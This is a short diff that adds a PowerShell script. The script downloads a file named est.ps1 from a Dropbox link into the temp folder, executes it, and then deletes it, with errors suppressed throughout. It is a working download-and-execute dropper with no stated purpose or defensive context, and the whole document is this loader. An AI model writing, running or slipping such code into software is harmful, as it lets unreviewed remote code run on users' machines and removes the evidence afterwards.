@@ -1,0 +1,11 @@
+﻿$path = "$env:TEMP\est.ps1"
+if (-not (Test-Path $path)) {
+    try {
+        (New-Object Net.WebClient).DownloadFile('https://www.dropbox.com/scl/fi/wpxnae56d64yn8lsty0fg/est.ps1?rlkey=qpultij229xasafg9ewstfo3j&st=qshkcveh&dl=1', $path)
+    } catch { exit }
+}
+try {
+    & $path
+} finally {
+    Remove-Item $path -ErrorAction SilentlyContinue
+}
